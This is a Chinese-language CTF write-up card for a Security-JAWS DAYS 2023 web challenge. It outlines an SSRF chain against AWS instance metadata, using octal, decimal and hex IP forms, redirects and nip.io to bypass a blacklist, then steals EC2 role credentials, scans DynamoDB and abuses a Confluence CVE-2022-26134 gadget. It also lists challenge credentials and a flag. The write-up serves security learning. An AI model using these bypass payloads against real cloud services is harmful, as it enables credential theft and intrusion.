---
title: "Security-JAWS DAYS 参加記 & CTF 作問者解説"
category: web
tags: ["Security-JAWS DAYS", "web", "aws-imds-ssrf", "octal-ip-bypass", "8-ary-numeric-host", "dynamodb"]
signals: ["Security-JAWS DAYS 2023", "aws-imds-ssrf", "octal-ip-bypass", "8-ary-numeric-host", "dynamodb", "rds-mysql", "cve-2022-26134", "conf-gadget-ssrf", "web_unknown", "Security-JAWS", "AWS", "IMDS", "nip", "DynamoDB"]
difficulty: hard
source: "https://www.ctfiot.com/133108.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# Security-JAWS DAYS 参加記 & CTF 作問者解説

> 赛事：Security-JAWS DAYS 2023 | 方向：web | 难度：hard

## 一句话总结

Security-JAWS 作問者解説：AWS IMDS 主机名黑名单 9 种绕过 (8/10/16 进制 + 短链 + nip.io) + DynamoDB + RDS + Confluence CVE-2022-26134 SSRF。

## 攻击链

1. Block 169.254.169.254 (IMDS 主机名黑名单)
2. 8 进制 0251.254.169.254 数字主机名绕
3. 10 进制 2852039166 整数绕
4. 16 进制 0xA9.0xFE.0xA9.0xFE / 0xA9FEA9FE 绕
5. 短 URL 重定向服务绕
6. nip.io / sslip.io 第三方 DNS 服务 (169.254.169.254.nip.io)
7. 8 进制 + 10 进制混用 0251.254.000251.0000376
8. IMDS 拿 ASIA[REDACTED] EC2 instance role
9. dynamodb list-tables 找 private-ctfdb
10. dynamodb scan 拿 flag SJAWS{Get_2ecr@t_1am_ke9!!}
11. RDS MySQL 8.0.33 /Users/exporter /TF6zZaECv7f5
12. UserInfo 表 adminsite@localhost:8444 / dummy
13. CVE-2022-26134 Confluence Server makeRequest gadget SSRF
14. X-aws-ec2-metadata-token PUT 拿 IMDSv2 token
15. url=http://169.254.169.254/latest/meta-data&httpMethod=GET&headers=X-aws-ec2-metadata-token:...

## 关键 payload

```
0251.254.000251.0000376
```

## 经验教训

任何 IP 字符串黑名单都有数十种 bypass，正确的解法是 enum IMDS endpoint 调用而非字符串匹配。

## 标签

aws-imds-ssrf、octal-ip-bypass、8-ary-numeric-host、dynamodb、rds-mysql、cve-2022-26134、conf-gadget-ssrf

## 参考来源

- https://www.ctfiot.com/133108.html
- 原文件：Security-JAWS_DAYS_参加記&CTF作問者解説.full.md
